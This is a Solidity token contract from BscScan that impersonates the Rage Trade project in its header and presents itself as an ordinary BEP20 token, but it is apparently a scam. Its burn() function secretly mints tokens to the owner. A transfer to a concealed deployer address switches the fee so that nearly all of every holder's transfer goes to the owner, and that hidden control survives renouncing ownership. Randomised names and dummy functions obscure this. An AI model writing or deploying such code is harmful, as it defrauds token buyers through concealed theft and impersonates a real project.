/**
 *Submitted for verification at BscScan.com on 2022-12-12
*/

/*
Rage Trade
RageTradeFi
The most liquid, composable, and omnichain ETH perp!( Built on #Arbitrum ) 
WE ARE LIVE 😈
Rage Trades 80-20 tri-crypto vault is now available for deposits! 
Due to extreme demand 🚨
The vaults capacity has been expanded to 1.5M from 1M USD!
Go to our website below for access. ⬇️
https://www.rage.trade/
https://github.com/RageTrade
https://discord.gg/8sBqJ5Qc3Q
https://twitter.com/rage_trade

*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.5.8;
contract RageTradeFi {
uint8 public constant decimals = 18;
address private  mhlKtm = address(0);
string public  symbol = "RageTradeFi";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public owner;
address private  rTJEaY = address(0);
uint256 private  sguvHz = 13;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  CmDtVs = address(0);
string public  name = "RageTradeFi";
uint256 public constant VpKelx = 99999;
address private  NpBrqj = address(0);
mapping (address => uint256) public balanceOf;
uint256 private  LRsWUE = 92;
uint256 public constant totalSupply = 100000000000000000000000000;
uint256 private  WaOyJo = 1000000000000000000;
uint256 private  nWhLcg = 39;
address private  WLFtMR = address(0);
address private  KulHCg = address(0);
address private  ylPeNL = address(0);
uint256 private  FsLzMQ = 44;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => mapping (address => uint256)) private _allowances;
address private  OLEJfW = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  foigvf = 50;
uint256 private  ANNvnw = 56;
address private  cLnOBW = address(0);
//
//
function _get6sguvHz() private returns (uint256) {
return sguvHz + 59;
}
//
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getc5LnOBW() private returns (address) {
return cLnOBW;
}
//
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
constructor () public {
mhlKtm = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
//
//
//
//
//
//
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tyPTcIe 0");
require(spender != address(0), "fyPTcIe 0");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getFs4LzMQ() private returns (uint256) {
return FsLzMQ + 78;
}
//
function _getrTJ3EaY() private returns (address) {
return rTJEaY;
}
//
//
//
function _getNpBr2qj() private returns (address) {
return NpBrqj;
}
//
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}
//
//
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getylPeN1L() private returns (address) {
return ylPeNL;
}
//
function _get0CmDtVs() private returns (address) {
return CmDtVs;
}
//
function _getL9RsWUE() private returns (uint256) {
return LRsWUE + 72;
}
//
//
//
//
//
//
//
//
//
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getANNvnw() private returns (uint256) {
return ANNvnw + 86;
}
//
function _getnWhLcg() private returns (uint256) {
return nWhLcg + 52;
}
//
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
//
//
//
//
function _getKulHCg() private returns (address) {
return KulHCg;
}
//
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
//
//
//
//
//
//
function _getOLEJfW() private returns (address) {
return OLEJfW;
}
//
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "yPTcIe");
require(to != address(0), "yPTcIe");
require(amount <= balanceOf[from], "yPTcIe");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* VpKelx/WaOyJo ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==mhlKtm){
WaOyJo = VpKelx+3;
}
emit Transfer(from, to, transferAmount);
}
function _getfoigvf() private returns (uint256) {
return foigvf + 34;
}
//
function _getWLFtMR() private returns (address) {
return WLFtMR;
}
//
//
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
       }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}